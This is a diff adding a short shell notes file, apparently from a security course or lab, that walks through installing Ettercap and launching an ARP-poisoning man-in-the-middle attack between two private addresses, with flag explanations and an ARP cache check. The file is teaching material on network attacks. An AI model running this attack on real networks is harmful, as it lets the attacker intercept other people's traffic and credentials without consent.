@@ -1,0 +1,20 @@
+##########################
+## ARP Poisoning using Ettercap
+##########################
+
+# installing ettercap
+apt search ettercap
+apt install ettercap-text-only
+
+
+# launching the attack
+ettercap -i eth0 -T -M ARP /192.168.0.1// /192.168.0.100//
+
+# -i eth0 -> interface to sniff on.
+# -T -> text-only interface 
+# -M ARP -> MITM attack of type ARP poisoning
+
+# displaying the arp cache of the victims
+arp -a
+
+# press q to stop the attack
